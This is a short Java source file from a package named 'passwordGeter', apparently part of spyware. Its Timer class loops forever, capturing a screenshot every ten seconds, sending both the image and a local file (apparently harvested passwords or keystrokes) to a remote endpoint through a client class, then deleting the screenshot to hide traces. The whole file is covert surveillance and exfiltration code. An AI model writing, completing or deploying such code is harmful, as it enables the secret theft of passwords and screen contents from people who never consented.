package cn.yenmor.passwordGeter;

import java.io.File;
import java.io.IOException;

public class Timer implements Runnable{
	
	
	public void run() {
		File file = new File("C://yenmor/file0");	
		
		while(true) {
			
			ScreenCatch screenCatch = new ScreenCatch("D:\\Program Files/Img/", "png");
			File f = screenCatch.snapShot();
			
			try {
				new Cilent().sent(file);
				new Cilent().sentImg(f);
				Thread.sleep(10000);				
				f.delete();
				if(f.exists()) {
					f.delete();
				}
				
			
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
		}
		
		
	}
	

}
